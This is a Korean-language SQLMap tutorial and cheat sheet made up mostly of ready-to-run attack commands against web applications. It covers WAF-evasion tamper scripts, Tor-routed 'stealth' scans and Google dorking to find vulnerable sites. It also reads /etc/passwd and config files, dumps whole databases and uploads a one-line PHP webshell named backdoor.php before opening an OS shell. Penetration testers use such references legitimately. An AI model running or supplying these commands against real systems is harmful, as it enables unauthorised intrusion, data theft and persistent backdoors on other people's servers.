SQLMap 완벽 가이드

SQLMap은 SQL Injection 취약점을 탐지하고 악용하는 가장 강력하고 널리 사용되는 오픈소스 자동화 도구입니다.

개념 (Concept)​

SQLMap이란?​

SQLMap은 Python으로 작성된 오픈소스 SQL Injection 자동화 도구로, 데이터베이스 취약점 탐지부터 데이터 추출, 시스템 제어까지 가능한 강력한 침투 테스트 도구입니다.

주요 기능:

  • 자동 SQL Injection 탐지
  • 6가지 SQLi 기법 지원 (Boolean, Error, Union, Stacked, Time, Out-of-band)
  • DBMS 핑거프린팅 (MySQL, MSSQL, PostgreSQL, Oracle 등)
  • 데이터베이스 열거 및 덤프
  • 파일 시스템 접근
  • OS 명령 실행 (RCE)
  • Out-of-band 연결

지원 DBMS (20개 이상):

  • MySQL, PostgreSQL, Oracle, MSSQL
  • SQLite, MongoDB, IBM DB2
  • SAP MaxDB, Sybase, Informix 등

공식 저장소: https://github.com/sqlmapproject/sqlmap

설치 (Installation)​

방법 1: Git Clone (권장)​

# 최신 버전 다운로드
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

cd sqlmap-dev

# 실행
python sqlmap.py -h

방법 2: apt/yum (Linux)​

# Debian/Ubuntu
sudo apt update
sudo apt install sqlmap

# Red Hat/CentOS
sudo yum install sqlmap

# 버전 확인
sqlmap --version

출력 예시:

sqlmap/1.7.2#stable

방법 3: pip​

pip install sqlmap

방법 4: Docker​

# Docker 이미지 pull
docker pull pwnsdx/sqlmap

# 실행
docker run --rm -it pwnsdx/sqlmap -u "http://example.com/page?id=1" --batch

대화형 모드 비활성화​

sqlmap -u "URL" --batch

설명: 모든 질문에 기본값으로 자동 응답 (자동화에 필수)

타겟 지정 옵션 (Target Options)​

1. URL 직접 지정 (-u, --url)​

sqlmap -u "http://example.com/page?id=1&name=test"

2. 특정 파라미터만 테스트 (-p)​

# id 파라미터만 테스트
sqlmap -u "http://example.com/page?id=1&name=test" -p id

3. POST 데이터 (--data)​

sqlmap -u "http://example.com/login" --data="username=admin&password=test"

4. 요청 파일 사용 (-r)​

Burp Suite에서 요청 캡처 후 파일로 저장 (request.txt):

POST /login.php HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

username=admin&password=test123

SQLMap 실행:

sqlmap -r request.txt

특정 파라미터만 테스트:

sqlmap -r request.txt -p username

5. URL 목록 파일 (-m)​

urls.txt:

http://site1.com/page?id=1
http://site2.com/product?pid=5
http://site3.com/article?aid=10

실행:

sqlmap -m urls.txt --batch

6. Google Dorking (-g)​

# Google 검색 결과에서 취약한 사이트 자동 탐지
sqlmap -g "inurl:product.php?id="

# 특정 도메인
sqlmap -g "site:example.com inurl:page.php?id="

7. 쿠키 설정 (--cookie)​

sqlmap -u "http://example.com/page?id=1" --cookie="PHPSESSID=abcd1234; role=user"

8. User-Agent 변경 (--user-agent)​

sqlmap -u "URL" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# 랜덤 User-Agent
sqlmap -u "URL" --random-agent

9. HTTP 헤더 (--headers)​

sqlmap -u "URL" --headers="X-Forwarded-For: 127.0.0.1\nAuthorization: Bearer token123"

10. Referer 설정 (--referer)​

sqlmap -u "URL" --referer="http://example.com/previous-page"

11. HTTP 메서드 변경 (--method)​

# PUT 메서드
sqlmap -u "URL" --method=PUT --data="field=value"

# DELETE 메서드
sqlmap -u "URL" --method=DELETE

탐지 옵션 (Detection Options)​

1. 테스트 레벨 (--level)​

범위: 1~5 (기본값: 1)

# Level 1 (기본): GET/POST 파라미터만
sqlmap -u "URL" --level=1

# Level 2: HTTP Cookie 헤더 포함
sqlmap -u "URL" --level=2

# Level 3: User-Agent, Referer 헤더 포함
sqlmap -u "URL" --level=3

# Level 4~5: 더 많은 페이로드, 더 깊은 테스트
sqlmap -u "URL" --level=5

레벨별 차이:

Level테스트 대상페이로드 수속도
1GET/POST적음빠름
2+ Cookie보통보통
3+ UA/Referer많음느림
4~5+ 모든 헤더매우 많음매우 느림

2. 위험도 (--risk)​

범위: 1~3 (기본값: 1)

# Risk 1 (기본): 안전한 페이로드만
sqlmap -u "URL" --risk=1

# Risk 2: OR 기반 페이로드 포함
sqlmap -u "URL" --risk=2

# Risk 3: UPDATE 쿼리 포함 (데이터 손상 가능!)
sqlmap -u "URL" --risk=3

위험도별 차이:

Risk페이로드 종류위험성
1안전 (AND 기반)낮음
2OR 기반 (다수 결과 반환)중간
3UPDATE/DELETE 쿼리높음 (데이터 손상)

3. SQLi 기법 선택 (--technique)​

# 특정 기법만 사용
sqlmap -u "URL" --technique=B    # Boolean-based만
sqlmap -u "URL" --technique=E    # Error-based만
sqlmap -u "URL" --technique=U    # Union-based만
sqlmap -u "URL" --technique=S    # Stacked queries만
sqlmap -u "URL" --technique=T    # Time-based만
sqlmap -u "URL" --technique=Q    # Inline queries만

# 여러 기법 조합
sqlmap -u "URL" --technique=BEU  # Boolean + Error + Union

# 모든 기법 (기본값)
sqlmap -u "URL" --technique=BEUSTQ

기법별 설명:

코드기법속도효율성
BBoolean-based Blind중간높음
EError-based빠름매우 높음
UUnion-based매우 빠름최고
SStacked queries빠름높음
TTime-based Blind느림중간
QInline queries빠름높음

4. DBMS 지정 (--dbms)​

# DBMS 미리 지정 (탐지 시간 절약)

sqlmap -u "URL" --dbms=MSSQL

고급 옵션 (Advanced Options)​

파일 시스템 접근​

1. 파일 읽기 (--file-read)​

# Linux
sqlmap -u "URL" --file-read="/etc/passwd"

# Windows
sqlmap -u "URL" --file-read="C:\Windows\System32\drivers\etc\hosts"

# 웹 설정 파일
sqlmap -u "URL" --file-read="/var/www/html/config.php"

저장 위치: ~/.sqlmap/output/example.com/files/

2. 파일 쓰기 (--file-write, --file-dest)​

# 로컬 파일을 원격 서버에 업로드
sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/html/backdoor.php"

shell.php:

<?php system($_GET['cmd']); ?>

웹쉘 접근:

http://example.com/backdoor.php?cmd=whoami

최적화 옵션 (Optimization Options)​

속도 조절​

사용 시나리오: Rate limiting 우회

3. Time-based 지연 시간 (--time-sec)​

# Time-based SQLi 테스트 시 5초 대기 (기본값)
sqlmap -u "URL" --time-sec=3

빠른 테스트: 3초로 단축

4. 타임아웃 (--timeout)​

# 연결 타임아웃 30초
sqlmap -u "URL" --timeout=30

5. 재시도 횟수 (--retries)​

# 실패 시 3번 재시도
sqlmap -u "URL" --retries=3

NULL 연결 사용 (--null-connection)​

sqlmap -u "URL" --null-connection

설명: HTTP Body 없이 헤더만 받아 속도 향상

우회 옵션 (Evasion Options)​

1. Tamper Scripts​

내장 Tamper Scripts (70개 이상):

# 공백을 /**/ 주석으로 대체
sqlmap -u "URL" --tamper=space2comment

# 공백을 + 기호로 대체
sqlmap -u "URL" --tamper=space2plus

# 따옴표를 16진수로 변환
sqlmap -u "URL" --tamper=charencode

# 여러 Tamper 동시 사용
sqlmap -u "URL" --tamper=space2comment,charencode,between

주요 Tamper Scripts:

Tamper Script기능우회 대상
space2comment공백 → /**/ModSecurity
apostrophemask' → %EF%BC%87WAF
base64encode전체 Base64 인코딩IDS
between> → NOT BETWEEN 0 AND #필터링
charencodeURL 인코딩WAF
equaltolike= → LIKE키워드 필터
greatest> → GREATEST연산자 차단
ifnull2ifisnullIFNULL → IF(ISNULL함수 차단
modsecurityversionedMySQL 버전 주석ModSecurity
randomcase대소문자 랜덤대소문자 필터
space2hash공백 → # + 랜덤 문자공백 차단
versionedkeywordsUNION → /*!UNION*/키워드 차단

Tamper 위치: /usr/share/sqlmap/tamper/

커스텀 Tamper 작성 예시 (custom.py):

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    공백을 탭으로 변경
    """
    return payload.replace(' ', '\t')

사용:

sqlmap -u "URL" --tamper=custom

세션 관리 (Session Management)​

1. 세션 저장 및 재개​

# 세션 ID 지정

# 이전 세션 재개
sqlmap -u "URL" --session-file=/tmp/mysession --resume

자동 세션 파일 위치: ~/.sqlmap/output/example.com/session.sqlite

2. 플러시 (--flush-session)​

# 이전 세션 삭제 후 새로 시작
sqlmap -u "URL" --flush-session

3. 캐시 사용 안 함 (--fresh-queries)​

sqlmap -u "URL" --fresh-queries

sqlmap -u "URL" -v 1

# 레벨 2: 디버그 정보
sqlmap -u "URL" -v 2

# 레벨 6: 모든 페이로드 출력
sqlmap -u "URL" -v 6

2. 트래픽 로그 (-t)​

# 모든 HTTP 트래픽 저장
sqlmap -u "URL" -t /tmp/traffic.log

3. 출력 디렉터리 지정 (--output-dir)​

sqlmap -u "URL" --output-dir=/tmp/sqlmap-results

4. CSV 형식 저장 (--dump-format)​

sqlmap -u "URL" -D webapp -T users --dump --dump-format=CSV

저장 위치: ~/.sqlmap/output/example.com/dump/webapp/users.csv

고급 사용 예시 (Advanced Examples)​

예시 1: POST 로그인 폼 공격​

sqlmap -u "http://example.com/login" \
  --data="username=admin&password=test" \
  -p username \
  --technique=BEUST \
  --level=5 \
  --risk=3 \
  --dbms=MySQL \
  --batch \
  --current-db \
  --dump

예시 2: Cookie 기반 SQLi​

sqlmap -u "http://example.com/dashboard" \
  --cookie="session_id=abc123; role=user" \
  -p session_id \
  --level=2 \
  --current-user \
  --is-dba

예시 3: JSON API 공격​

sqlmap -u "http://api.example.com/user" \
  --method=POST \
  --headers="Content-Type: application/json" \
  --data='{"id": 1*, "name": "test"}' \
  -p id \
  --batch

참고: *는 주입 지점 표시

예시 4: WAF 우회 + Tor​

sqlmap -u "http://example.com/page?id=1" \
  --tor \
  --tor-type=SOCKS5 \
  --check-tor \
  --tamper=space2comment,between,randomcase \
  --random-agent \
  --delay=2 \
  --batch

예시 5: 대량 스캔​

sqlmap -m urls.txt \
  --batch \
  --threads=5 \
  --technique=U \
  --level=1 \
  --risk=1 \
  --dbs

예시 6: OS 쉘 획득​

sqlmap -u "http://example.com/page?id=1" \
  --os-shell \
  --batch \
  --technique=S

예시 7: SQL 쿼리 직접 실행 (--sql-query)​

sqlmap -u "URL" --sql-query="SELECT user()"
sqlmap -u "URL" --sql-query="SELECT @@version"
sqlmap -u "URL" --sql-query="SELECT * FROM users LIMIT 5"

예시 8: SQL 쉘 (--sql-shell)​

sqlmap -u "URL" --sql-shell

사용:

sql-shell> SELECT database();
webapp

sql-shell> SELECT COUNT(*) FROM users;
10

sql-shell> SELECT username FROM users WHERE id=1;
admin

자주 사용하는 조합 (Common Combinations)​

빠른 스캔​

sqlmap -u "URL" --batch --technique=EU --threads=10

깊은 스캔​

sqlmap -u "URL" --batch --level=5 --risk=3 --threads=5

스텔스 스캔 (탐지 회피)​

sqlmap -u "URL" --random-agent --delay=3 --tor --tamper=space2comment,randomcase

전체 DB 추출​

sqlmap -u "URL" --batch --dump-all --exclude-sysdbs --threads=10

트러블슈팅 (Troubleshooting)​

1. 403 Forbidden 에러​

해결:

sqlmap -u "URL" --random-agent --tamper=space2comment

2. WAF 탐지​

해결:

sqlmap -u "URL" --tamper=space2comment,between,charencode --delay=2 --random-agent

3. False Positive​

해결:

# String-based 비교 사용
sqlmap -u "URL" --string="Welcome"

# Regex 사용
sqlmap -u "URL" --regexp="<title>.*</title>"

4. Time-based가 너무 느림​

해결:

sqlmap -u "URL" --technique=BEU --time-sec=3

5. 연결 실패​

해결:

sqlmap -u "URL" --timeout=60 --retries=5

빠른 명령어 참조 (Quick Reference)​

기본 스캔​

# GET 파라미터
sqlmap -u "http://example.com/page?id=1" --batch

# POST 파라미터
sqlmap -u "URL" --data="user=test&pass=123" --batch

# Cookie
sqlmap -u "URL" --cookie="PHPSESSID=abc" -p PHPSESSID --batch

데이터 추출​

# 현재 DB
sqlmap -u "URL" --current-db

# 테이블 목록
sqlmap -u "URL" -D dbname --tables

# 데이터 덤프
sqlmap -u "URL" -D dbname -T users --dump

# 전체 덤프
sqlmap -u "URL" --dump-all --exclude-sysdbs

파일/OS 접근​

# 파일 읽기
sqlmap -u "URL" --file-read="/etc/passwd"

# 웹쉘 업로드
sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# OS 쉘
sqlmap -u "URL" --os-shell

최적화​

# 빠른 스캔
sqlmap -u "URL" --batch --technique=EU --threads=10

# WAF 우회
sqlmap -u "URL" --tamper=space2comment,randomcase --random-agent --delay=2

# Tor 사용
sqlmap -u "URL" --tor --tor-type=SOCKS5 --check-tor
